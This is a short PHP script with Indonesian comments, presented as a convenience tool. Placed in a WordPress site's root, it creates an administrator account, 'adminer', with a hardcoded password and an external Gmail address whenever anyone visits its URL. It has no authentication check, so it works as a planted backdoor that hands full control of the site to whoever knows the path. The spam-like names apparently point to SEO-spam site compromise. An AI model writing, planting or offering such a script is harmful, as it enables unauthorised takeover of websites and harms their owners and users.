<?php
/**
 * Auto Create Admin User for WordPress
 * Simpan file ini dengan nama 'buat-admin.php' di folder root WordPress Anda.
 * Jalankan dengan mengakses: namadomain.com/buat-admin.php
 */

// Memuat fungsi utama WordPress
require_once('wp-load.php');

function create_admin_user() {
    $username = 'adminer';
    $password = 'seomagang';
    $email    = 'dumplink60@gmail.com';
    $role     = 'administrator';

    // Cek apakah username sudah ada
    if ( !username_exists( $username ) && !email_exists( $email ) ) {
        
        // Buat user baru
        $user_id = wp_create_user( $username, $password, $email );
        
        if ( !is_wp_error( $user_id ) ) {
            // Set role menjadi administrator
            $user = new WP_User( $user_id );
            $user->set_role( $role );
            
            echo "<h3>Berhasil!</h3>";
            echo "User <b>$username</b> telah dibuat sebagai <b>$role</b>.<br>";
            echo "Silakan login di <a href='wp-login.php'>Halaman Login</a>.";
        } else {
            echo "Gagal membuat user: " . $user_id->get_error_message();
        }
        
    } else {
        echo "Error: Username atau Email sudah terdaftar di database.";
    }
}

// Jalankan fungsi
create_admin_user();